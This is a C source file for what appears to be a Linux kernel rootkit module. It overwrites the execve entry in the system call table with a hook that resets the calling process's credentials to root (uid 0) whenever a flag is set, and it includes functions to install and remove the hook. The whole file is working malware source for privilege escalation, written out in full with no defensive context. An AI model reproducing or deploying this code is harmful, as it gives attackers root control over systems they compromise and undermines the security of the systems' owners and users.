#include "sys_escalation.h"
#include "syscall_table.h"
#include "utils.h"

/* set root escalation flag */
int sys_esc_flag = 0;

/* function pointer to default execve syscall */ 
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
static t_syscall def_execve;
#else
typedef asmlinkage int (*def_execve_t) (const char *filename, const char *const argv[], const char *const envp[]);
def_execve_t def_execve;
#endif

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static asmlinkage int khook_execve(const struct pt_regs *pt_regs)
{
  int ret = def_execve(pt_regs), err;
#else
asmlinkage int khook_execve(const char *filename, const char *const argv[], const char *const envp[])
{
	int ret = def_execve(filename, argv, envp), err;
#endif
	if (sys_esc_flag == 1) {

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
		current->uid = current->gid = 0;
		current->euid = current->egid = 0;
		current->suid = current->sgid = 0;
		current->fsuid = current->fsgid = 0;
#else
	  /* generating root permissions */
	  struct cred *np;
	  np = prepare_creds();

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0)	\
  && defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS)		\
  || LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
	  np->uid.val = np->gid.val = 0;
	  np->euid.val = np->egid.val = 0;
	  np->suid.val = np->sgid.val = 0;
	  np->fsuid.val = np->fsgid.val = 0;
#else
	  np->uid = np->gid = 0;
	  np->euid = np->egid = 0;
	  np->suid = np->sgid = 0;
	  np->fsuid = np->fsgid = 0;
#endif

	  /* commit creds to task_struct of current process */
	  commit_creds(np);
	}
#endif

	/* call the origin syscall */
	return ret;
}

void do_priv_esc(void)
{
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
  /* set pointers to origin syscall */
  def_execve = (t_syscall)table_ptr[__NR_execve];
#else
  def_execve = (def_execve_t)table_ptr[__NR_execve];
#endif

  /* set the system call table writeable */
  set_sct_rw(table_ptr);

  /* hook execve syscall */
  table_ptr[__NR_execve] = (unsigned long)khook_execve;

  /* set the system call table write protected */
  set_sct_ro(table_ptr);

  /* set privesc bit to 1 */
  sys_esc_flag = 1;
}

void undo_priv_esc(void)
{
  /* set the system call table writeable */
  set_sct_rw(table_ptr);

  /* rewrite the original syscall addresses */
  table_ptr[__NR_execve] = (unsigned long)def_execve;

  /* set the system call table write protected */
  set_sct_ro(table_ptr);

  /* set privesc bit to 0 */
  sys_esc_flag = 0;
}
